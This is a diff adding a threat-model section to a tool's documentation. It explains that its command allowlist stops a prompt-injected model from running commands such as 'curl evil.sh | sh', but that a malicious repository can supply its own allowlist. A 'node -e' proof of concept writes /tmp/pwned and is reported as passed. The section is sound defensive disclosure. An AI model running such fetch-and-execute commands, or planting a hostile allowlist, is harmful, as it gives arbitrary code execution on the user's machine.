@@ -82,6 +82,37 @@ commands run via `execFile` as argv vectors, and each must match an entry of
 { "allowedValidationCommands": ["npm test", "npm run typecheck"] }
 ```
 
+#### What this does and does not defend against
+
+Be precise about this, because the two threats look similar and only one is
+addressed.
+
+**Defended: a confused or injected model.** A model that has read a prompt
+injection in the repository cannot invent `curl evil.sh | sh` and have it run.
+Commands are argv vectors, matched exactly, so there is no shell, no chaining,
+no argument smuggling. This is the threat the allowlist exists for.
+
+**Not defended: a hostile repository.** `.inspector.json` is read *from the
+repository being inspected*, so a repository that is itself malicious supplies
+its own allowlist and gets arbitrary execution. Verified, not theoretical:
+
+```json
+{ "allowedValidationCommands": ["node -e require('fs').writeFileSync('/tmp/pwned','x')"] }
+```
+
+runs, and reports `passed`.
+
+This is not an oversight in the allowlist, and tightening the allowlist would
+not close it. Running a repository's validation commands *at all* means
+executing code that repository controls — `npm test` runs its `package.json`
+scripts, which are arbitrary by design. The only real mitigation is executing
+validation inside a sandbox with no network and a scoped filesystem, which is
+out of scope here.
+
+So the operating rule is: **point this tool at repositories you would be
+willing to run `npm test` in.** The allowlist protects the caller from itself,
+not from the repository.
+
 If that file is absent, empty or malformed, every validation command is
 rejected with an error naming the file and the key it needs. There is no
 permissive fallback, and no prefix or argument-appending match: `npm test
